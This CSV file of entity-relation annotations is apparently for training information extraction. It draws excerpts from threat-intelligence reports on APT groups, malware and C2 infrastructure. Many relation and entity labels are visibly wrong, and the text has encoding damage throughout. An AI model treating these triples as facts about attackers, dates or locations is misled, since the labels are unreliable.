"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"Mandiant_APT1_Report","hasattacktime","Post","ORG","Feb. 1, 2013","DATE","2 ¡ ° Chinese hackers suspected in attack on The Post¡¯s computers.¡± The Washington Post , Feb. 1 , 2013 , http://www.washingtonpost.com/business/ technology / chinese - hackers - suspected - in - attack - on - the - posts - computers/2013/02/01 / d5a44fde-6cb1 - 11e2 - bd36 - c0fe61a205f6_story.html , accessed Feb. 1 , 2013 . "
"fireeye-malware-supply-chain","indicates","11:18 UTC","TIME","a little less than 3 hours","TIME","The compile time of the builder is 10/23/2012 11:18 UTC , a little less than 3 hours after the compile time of the server that is produced by it . "
"2013-9","hasattacklocation","Mandiant","ORG","China","GPE","Similarly , the Mandiant report shows that the APT1 group has monitored Mandiant¡¯s energy industry customers from approximately the beginning of 2009 to 2012.24 During these attacks , APT1 would export terabytes of data from the victims to China . In tandem with these revelations , China¡¯s also aggressively pursued oil supply contracts during 2009.25 During this time major Chinese state oil companies acquired holdings in 18 different countries . China is determined to take on oil and gas infrastructure development and to acquire oil industry assets.26 "
"rpt-operation-saffron-rose","indicates","23:16","TIME","two","CARDINAL","We identified two implants that were both compiled on 2014 - 3 - 15 at 23:16 . "
"2013-9","hasattacktime","$40 Billion","MONEY","the years of 2010-2012","DATE","As of March 2013 BP has been forced to spend or provision $ 40 Billion as a result of Deepwater Horizon.63 To put this in perspective , BP¡¯s combined profits for the years of 2010 - 2012 amount to about $ 34.6 billion.64 "
"C5_APT_C2InTheFifthDomain","hasattacklocation","SKCommunications","ORG","France","GPE","Following the intrusion into the SKCommunications network it became widely known that the domain was being used for malicious purposes , and perhaps for this reason , the oneyear registrationwasnotrenewed by theattacker . Despitethis , anumberof victims aroundtheworldcontinuedto usethedomainto locatetheirC2server , resulting inattempted communicationsto a C2 server that no longerexists . THE VICTIMS Computers using IP addresses allocated to France , thePeople¡¯sRepublicof China , Portugal , SouthKorea , Taiwan , the United Kingdom and the United States areamong thosethat attemptedto "
"crowdstrike-deep-panda-report","authored","Sun","PERSON","29604","CARDINAL","This functionality is nearly identical to the code posted by Edward Sun ( aka cardmagic , sunmy1@sina.com , onlyonejazz@hotmail.com , cardcian@mail.ustc.edu.cn , QQ # 28025945 ) from Hefei , Anhui province ( Nanjing Military District ) on July 8 , 2007 , then a China - based researcher at Trend Micro ( now working at at http://forum.eviloctal.com/viewthread.php?action=printable&tid=29604 ( See Appendix G ) . CrowdStrike has no information connecting Mr. Sun to this intrusion activity , his code appears to have been appropriated by the actor to add similar functionality to their code . "
"hidden_lynx","hasattacklocation","Trojan.Naid","ORG","China","GPE","Trojan . Naid The team uses Trojan . Naid for special operations . It first appeared in May 2009 and has been used in many high profile attacks over the past four years . It shares technical similarities with other Trojans which also originate from China . "
"fireeye-malware-supply-chain","hasattacklocation","Trojan.APT.PoisonIvy","ORG","four","CARDINAL","These samples were all detected as Trojan . APT.9002 and appeared in four of the 10 campaigns we studied during this research . We found 15 samples signed with the certificate from Wuhan Tian Chen Information Technology Co. , Ltd. These samples were all detected as Trojan . APT.PoisonIvy and appeared in one of the 10 campaigns discussed below . "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","hasproduct","Microsoft","ORG","Windows","PRODUCT","subnets of IPs which are part of current Microsoft Windows domain as reported by the Domain Controller Scanning procedure "
"Securelist_RedOctober_Detail","hasproduct","Cisco","ORG","Windows Mobile","PRODUCT","Broad variety of targets : Beside traditional attack targets ( workstations ) , the system is capable of stealing data from mobile devices , such as smartphones ( iPhone , Nokia , Windows Mobile ) , enterprise network equipment ( Cisco ) , removable disk drives ( including already deleted files via a custom file recovery procedure ) . "
"Mandiant_APT1_Report","hasattacklocation","PLA","ORG","China","GPE","The close proximity of these amenities supports the contention that Unit 61398 occupies a high - level position in the PLA organizational hierarchy ( see Figure 1 : Unit 61398¡¯s positions within the PLA).24 PLa unit 61398 and state - owned enterprise China telecom are Co - building Computer network operations Infrastructure Mandiant found an internal China Telecom document online that provides details about the infrastructure provided to Unit 61398 . "
"hidden_lynx","hasproduct","CVE-2013-1493","ORG","C&C","PRODUCT","Within two days of Bit9¡¯s blog post on February 25 , the attackers began distributing Moudoor and Naid in a campaign that leveraged CVE-2013 - 1493 . Interestingly , the C&C server configured in Naid ( 110.173.55.187 ) was also configured in a sample found in the Bit9 incident . "
"fireeye-china-chopper-report","hasproduct","China Chopper","ORG","Linux","PRODUCT","China Chopper can also run transparently on both Windows and Linux . This OS and application flexibility make China Chopper an even more dangerous Web shell . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","Travnet","ORG","China","GPE","www.viprambler.com Let¡¯s start with the analysis of ¡ ° www.viprambler.com¡±. WHOIS record for the domain currently is as follows : Registrant information for the domain is as follows : Our analysis strongly suggests that the group behind Travnet might be from China . "
"Mandiant_APT1_Report","hasattacktime","Word 2007","WORK_OF_ART","2012)","DATE","An information hiding method of Word 2007 based on image covering,¡± Journal of Sichuan University ( Natural Science Edition ) 47 ( 2010 ) , http://www.paper.edu.cn/journal/downCount/0490-6756(2010)S1-0031-06 , accessed February 6 , 2013 . 16 Hebei Chamber of Commerce , Bio of member Wang Weizhong ( 2012 ) , http://www.hbsh.org/shej_ejsheqmsg . "
"Kimsuky","hasattacklocation","KIDA","ORG","North Korea","GPE","KIDA 's mission is to contribute to rational defense policy - making through intensive and systematic research and analysis of defense issues . Ministry of Unification The Ministry of Unification is an executive department of the South Korean government responsible for working towards the reunification of Korea . Its major duties are : establishing North Korea Policy , coordinating inter - Korean dialogue , pursuing inter - Korean cooperation and educating the public on unification . "
"hidden_lynx","targets","FINSHO","PERSON","C&C","PRODUCT","FINSHO Within two days of Bit9¡¯s blog post on February 25 , the attackers began distributing Moudoor and Naid in a campaign that leveraged CVE-2013 - 1493 . Interestingly , the C&C server configured in Naid ( 110.173.55.187 ) was also configured in a sample found in the Bit9 incident . "
"2q-report-on-targeted-attack-campaigns","hasattacklocation","EvilGrab","ORG","Canada","GPE","EvilGrab was also found in the United States , Canada , France , Spain , and Australia , among others . "
"NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web","hasattacktime","RTF","ORG","zero day","DATE","As far as we can tell they are only using known vulnerabilities ; no zero day attacks . Documents The first exploit we observed was included in the RTF files used in the Telenor attack . "
"Safe-a-targeted-threat","hasattacklocation","C&C","ORG","Hong Kong","GPE","The extensive logging performed by the C&C servers , however , allowed us to differentiate between the victims¡¯ and operators¡¯ IP addresses . Table 3 : Geographic Locations of the Mongolbaatar C&C Server Operators¡¯ IP Addresses Table 4 : Geographic Locations of the Getapencil C&C Server Operators¡¯ IP Addresses While most of the operator interactions we saw were from China and Hong Kong , we also saw the use of VPNs and proxy tools , including Tor , which contributed to the geographic diversity of the operators¡¯ IP addresses . "
"2013-9","hasattacklocation","the Washington Times","ORG","China","GPE","according to the Washington Times , China is already surpassing the United States as the number one oil importer from the Middle East18 , and poised to become the number one oil importer globally . Increasing Demand Chinese demand for oil has grown dramatically as its economy continues to expand . Since the mid-1990s , China has been a net importer of oil.19 The continuous growth of the Chinese economy has resulted in vast increases in the need for fuel and petro products . "
"C5_APT_C2InTheFifthDomain","hasattacktime","Lelli","PERSON","2010","DATE","A Lelli , A. ( 2010 , March 12 ) . "
"fireeye-operation-ke3chang","hasattacktime","three","CARDINAL","the years","DATE","Malware analysis and timeline Over the years , the Ke3chang attackers have used three types of malware that we call : ¡ ° BS2005¡± , ¡ ° BMW¡± , and ¡ ° MyWeb¡±. "
"comment_crew_indicators_of_compromise","hasattacklocation","Obama","PERSON","North Africa","GPE","President Chavezs Comments About President Obama and the United States on Sundays "" Alo , Presidente "" . FW : New Standdard Operational Procedures ( SOPs ) between the . AGENDA . [ REMOVED ] Help You Save Enough for Retirement . Human right of north Afica under war . Spreading Civil Unrest in the Middle East and North Africa . "
